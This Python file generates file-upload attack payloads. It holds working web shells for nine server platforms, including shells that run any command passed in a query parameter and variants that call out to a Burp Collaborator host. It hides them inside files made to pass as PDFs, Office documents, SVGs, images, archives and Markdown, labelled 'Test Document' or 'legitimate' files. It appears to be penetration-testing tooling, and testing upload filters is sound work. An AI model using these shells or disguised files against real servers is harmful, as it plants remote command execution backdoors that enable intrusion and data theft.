from pathlib import Path
import zipfile
import shutil
import base64

def generate_webshell_payloads(output_dir, ext, burp_collab):
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    base_url = f"http://{burp_collab}"
    
    webshell_dir = output_dir / 'webshell'
    webshell_dir.mkdir(exist_ok=True)
    
    webshells = {
        'php': {
            'id': '<?php system("id"); ?>',
            'cmd': '<?php if(isset($_GET["cmd"])) { echo shell_exec($_GET["cmd"]); } ?>',
            'burp': f'<?php file_get_contents("{base_url}/webshell-php"); ?>'
        },
        'jsp': {
            'id': '<%@ page import="java.io.*" %><% Process p = Runtime.getRuntime().exec("id"); BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while((line = br.readLine()) != null) { out.println(line); } %>',
            'cmd': '<%@ page import="java.io.*" %><% String cmd = request.getParameter("cmd"); if(cmd != null) { Process p = Runtime.getRuntime().exec(cmd); BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while((line = br.readLine()) != null) { out.println(line); } } %>',
            'burp': f'<%@ page import="java.net.*" %><% URL url = new URL("{base_url}/webshell-jsp"); URLConnection conn = url.openConnection(); conn.connect(); %>'
        },
        'asp': {
            'id': '<% Set objShell = CreateObject("WScript.Shell") Set objExec = objShell.Exec("id") Response.Write(objExec.StdOut.ReadAll) %>',
            'cmd': '<% Dim cmd cmd = Request.QueryString("cmd") If cmd <> "" Then Set objShell = CreateObject("WScript.Shell") Set objExec = objShell.Exec(cmd) Response.Write(objExec.StdOut.ReadAll) End If %>',
            'burp': f'<% Dim xmlHttp Set xmlHttp = CreateObject("MSXML2.XMLHTTP") xmlHttp.Open "GET", "{base_url}/webshell-asp", False xmlHttp.Send %>'
        },
        'aspx': {
            'id': '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe", "/c id").WaitForExit(); %>',
            'cmd': '<%@ Page Language="C#" %><% string cmd = Request.QueryString["cmd"]; if(cmd != null) { System.Diagnostics.Process.Start("cmd.exe", "/c " + cmd).WaitForExit(); } %>',
            'burp': f'<%@ Page Language="C#" %><% System.Net.WebClient client = new System.Net.WebClient(); client.DownloadString("{base_url}/webshell-aspx"); %>'
        },
        'python': {
            'id': 'import os; os.system("id")',
            'cmd': 'import os, sys; cmd = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("cmd"); os.system(cmd) if cmd else None',
            'burp': f'import urllib.request; urllib.request.urlopen("{base_url}/webshell-python")'
        },
        'nodejs': {
            'id': 'const { exec } = require("child_process"); exec("id", (error, stdout) => { console.log(stdout); });',
            'cmd': 'const { exec } = require("child_process"); const cmd = process.argv[2] || process.env.cmd; if(cmd) exec(cmd, (error, stdout) => { console.log(stdout); });',
            'burp': f'const https = require("https"); https.get("{base_url}/webshell-nodejs", () => {{}});'
        },
        'ruby': {
            'id': 'system("id")',
            'cmd': 'cmd = ARGV[0] || ENV["cmd"]; system(cmd) if cmd',
            'burp': f'require "net/http"; Net::HTTP.get(URI("{base_url}/webshell-ruby"))'
        },
        'perl': {
            'id': 'system("id");',
            'cmd': 'my $cmd = $ARGV[0] || $ENV{cmd}; system($cmd) if $cmd;',
            'burp': f'use LWP::Simple; get("{base_url}/webshell-perl");'
        },
        'coldfusion': {
            'id': '<cfexecute name="id" timeout="10" />',
            'cmd': '<cfparam name="url.cmd" default="" /><cfif len(url.cmd)><cfexecute name="#url.cmd#" timeout="10" /></cfif>',
            'burp': f'<cfhttp url="{base_url}/webshell-coldfusion" method="get" />'
        }
    }
    
    for backend_name, webshell_code in webshells.items():
        backend_dir = webshell_dir / backend_name
        backend_dir.mkdir(exist_ok=True)
        
        if ext == 'pdf':
            _create_pdf_webshell(backend_dir, backend_name, webshell_code, ext, base_url)
        elif ext in ['docx', 'xlsx', 'pptx']:
            _create_office_webshell(backend_dir, backend_name, webshell_code, ext, base_url)
        elif ext == 'svg':
            _create_svg_webshell(backend_dir, backend_name, webshell_code, ext, base_url)
        elif ext == 'html':
            _create_html_webshell(backend_dir, backend_name, webshell_code, ext, base_url)
        elif ext == 'xml':
            _create_xml_webshell(backend_dir, backend_name, webshell_code, ext, base_url)
        elif ext in ['txt', 'csv', 'rtf']:
            _create_text_webshell(backend_dir, backend_name, webshell_code, ext, base_url)
        elif ext in ['png', 'jpg', 'jpeg', 'gif']:
            _create_image_webshell(backend_dir, backend_name, webshell_code, ext, base_url)
        elif ext in ['zip', 'jar', 'epub']:
            _create_archive_webshell(backend_dir, backend_name, webshell_code, ext, base_url)
        elif ext in ['odt', 'ods', 'odp']:
            _create_office_webshell(backend_dir, backend_name, webshell_code, ext, base_url)
        elif ext in ['md', 'markdown']:
            _create_markdown_webshell(backend_dir, backend_name, webshell_code, ext, base_url)
        else:
            _create_generic_webshell(backend_dir, backend_name, webshell_code, ext, base_url)

def _create_pdf_webshell(backend_dir, backend_name, webshell_code, ext, base_url):
    for ws_type, code in [('id', webshell_code['id']), ('cmd', webshell_code['cmd']), ('burp', webshell_code['burp'])]:
        pdf_content = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/JavaScript <<
/Names [({code}) /JS]
>>
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Annots [5 0 R]
>>
endobj
4 0 obj
<<
/Length 50
>>
stream
BT
/F1 12 Tf
100 700 Td
(Test Document) Tj
ET
endstream
endobj
5 0 obj
<<
/Type /Annot
/Subtype /Text
/Rect [200 700 300 750]
/Contents ({code})
>>
endobj
xref
0 6
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
500
%%EOF'''
        filename = f"webshell1_{ws_type}.{ext}"
        with open(backend_dir / filename, 'wb') as f:
            f.write(pdf_content.encode())

def _create_office_webshell(backend_dir, backend_name, webshell_code, ext, base_url):
    try:
        from docx import Document
    except ImportError:
        return
    
    for ws_type, code in [('id', webshell_code['id']), ('cmd', webshell_code['cmd']), ('burp', webshell_code['burp'])]:
        if ext == 'docx':
            doc = Document()
            doc.add_paragraph('Test Document')
            docx_path = backend_dir / f"webshell1_{ws_type}.{ext}"
            doc.save(docx_path)
            
            with zipfile.ZipFile(docx_path, 'r') as zip_ref:
                temp_dir = backend_dir / f"temp_{ws_type}"
                zip_ref.extractall(temp_dir)
            
            document_xml_path = temp_dir / "word" / "document.xml"
            if document_xml_path.exists():
                import xml.etree.ElementTree as ET
                tree = ET.parse(document_xml_path)
                root = tree.getroot()
                ns = {'w': 'http://schemas.openxmlformats.org/wordprocessingml/2006/main'}
                for p in root.findall('.//w:p', ns):
                    comment = ET.Comment(f' {code} ')
                    p.append(comment)
                    break
                tree.write(document_xml_path, encoding='utf-8', xml_declaration=True)
            
            with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_dir.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_dir)
                        zip_ref.write(file_path, arcname)
            
            shutil.rmtree(temp_dir, ignore_errors=True)
        elif ext in ['xlsx', 'pptx', 'odt', 'ods', 'odp']:
            filename = f"webshell1_{ws_type}.{ext}"
            with zipfile.ZipFile(backend_dir / filename, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                if ext == 'xlsx':
                    zip_ref.writestr('[Content_Types].xml', '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"></Types>')
                    zip_ref.writestr('xl/workbook.xml', f'<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheets></sheets><!-- {code} --></workbook>')
                elif ext == 'pptx':
                    zip_ref.writestr('[Content_Types].xml', '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"></Types>')
                    zip_ref.writestr('ppt/presentation.xml', f'<?xml version="1.0"?><p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"><!-- {code} --></p:presentation>')
                else:
                    zip_ref.writestr('content.xml', f'<?xml version="1.0"?><office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"><!-- {code} --></office:document>')
                    zip_ref.writestr('meta.xml', f'<?xml version="1.0"?><office:document-meta xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"><!-- {code} --></office:document-meta>')
                zip_ref.writestr('META-INF/manifest.xml', '<?xml version="1.0"?><manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0"></manifest:manifest>')

def _create_svg_webshell(backend_dir, backend_name, webshell_code, ext, base_url):
    for ws_type, code in [('id', webshell_code['id']), ('cmd', webshell_code['cmd']), ('burp', webshell_code['burp'])]:
        svg_content = f'''<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="45" fill="green"/>
  <!-- {code} -->
  <script type="text/javascript">
    <![CDATA[
      // {code}
    ]]>
  </script>
</svg>'''
        filename = f"webshell1_{ws_type}.{ext}"
        with open(backend_dir / filename, 'w', encoding='utf-8') as f:
            f.write(svg_content)

def _create_html_webshell(backend_dir, backend_name, webshell_code, ext, base_url):
    for ws_type, code in [('id', webshell_code['id']), ('cmd', webshell_code['cmd']), ('burp', webshell_code['burp'])]:
        html_content = f'''<!DOCTYPE html>
<html>
<head>
<title>Test Document</title>
<!-- {code} -->
</head>
<body>
<h1>Test Document</h1>
<script>
  // {code}
</script>
</body>
</html>'''
        filename = f"webshell1_{ws_type}.{ext}"
        with open(backend_dir / filename, 'w', encoding='utf-8') as f:
            f.write(html_content)

def _create_xml_webshell(backend_dir, backend_name, webshell_code, ext, base_url):
    for ws_type, code in [('id', webshell_code['id']), ('cmd', webshell_code['cmd']), ('burp', webshell_code['burp'])]:
        xml_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<root>
  <data>Test Document</data>
  <!-- {code} -->
  <![CDATA[
    {code}
  ]]>
</root>'''
        filename = f"webshell1_{ws_type}.{ext}"
        with open(backend_dir / filename, 'w', encoding='utf-8') as f:
            f.write(xml_content)

def _create_text_webshell(backend_dir, backend_name, webshell_code, ext, base_url):
    for ws_type, code in [('id', webshell_code['id']), ('cmd', webshell_code['cmd']), ('burp', webshell_code['burp'])]:
        text_content = f'''Test Document
This is a legitimate {ext.upper()} file.

{code}

End of document.'''
        filename = f"webshell1_{ws_type}.{ext}"
        with open(backend_dir / filename, 'w', encoding='utf-8') as f:
            f.write(text_content)

def _create_image_webshell(backend_dir, backend_name, webshell_code, ext, base_url):
    for ws_type, code in [('id', webshell_code['id']), ('cmd', webshell_code['cmd']), ('burp', webshell_code['burp'])]:
        if ext == 'png':
            png_header = b'\x89PNG\r\n\x1a\n'
            iend = b'\x00\x00\x00\x00IEND\xaeB`\x82'
            code_bytes = code.encode('utf-8')
            filename = f"webshell1_{ws_type}.{ext}"
            with open(backend_dir / filename, 'wb') as f:
                f.write(png_header)
                f.write(b'\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde')
                f.write(code_bytes)
                f.write(iend)
        elif ext in ['jpg', 'jpeg']:
            jpg_header = b'\xff\xd8\xff\xe0\x00\x10JFIF'
            jpg_footer = b'\xff\xd9'
            code_bytes = code.encode('utf-8')
            filename = f"webshell1_{ws_type}.{ext}"
            with open(backend_dir / filename, 'wb') as f:
                f.write(jpg_header)
                f.write(code_bytes)
                f.write(jpg_footer)
        else:
            _create_generic_webshell(backend_dir, backend_name, {ws_type: code}, ext, base_url)

def _create_archive_webshell(backend_dir, backend_name, webshell_code, ext, base_url):
    for ws_type, code in [('id', webshell_code['id']), ('cmd', webshell_code['cmd']), ('burp', webshell_code['burp'])]:
        filename = f"webshell1_{ws_type}.{ext}"
        with zipfile.ZipFile(backend_dir / filename, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            zip_ref.writestr('test.txt', f'Test Document\n{code}')
            if backend_name == 'php':
                zip_ref.writestr('shell.php', code)
            elif backend_name == 'jsp':
                zip_ref.writestr('shell.jsp', code)

def _create_markdown_webshell(backend_dir, backend_name, webshell_code, ext, base_url):
    for ws_type, code in [('id', webshell_code['id']), ('cmd', webshell_code['cmd']), ('burp', webshell_code['burp'])]:
        md_content = f'''# Test Document

This is a legitimate Markdown file.

```{backend_name}
{code}
```

End of document.'''
        filename = f"webshell1_{ws_type}.{ext}"
        with open(backend_dir / filename, 'w', encoding='utf-8') as f:
            f.write(md_content)

def _create_generic_webshell(backend_dir, backend_name, webshell_code, ext, base_url):
    if isinstance(webshell_code, dict) and all(k in webshell_code for k in ['id', 'cmd', 'burp']):
        for ws_type, code in [('id', webshell_code['id']), ('cmd', webshell_code['cmd']), ('burp', webshell_code['burp'])]:
            content = f'''Test Document
This is a legitimate {ext.upper()} file.

{code}

End of document.'''
            filename = f"webshell1_{ws_type}.{ext}"
            with open(backend_dir / filename, 'w', encoding='utf-8') as f:
                f.write(content)
    else:
        for ws_type, code in webshell_code.items():
            content = f'''Test Document
This is a legitimate {ext.upper()} file.

{code}

End of document.'''
            filename = f"webshell1_{ws_type}.{ext}"
            with open(backend_dir / filename, 'w', encoding='utf-8') as f:
                f.write(content)
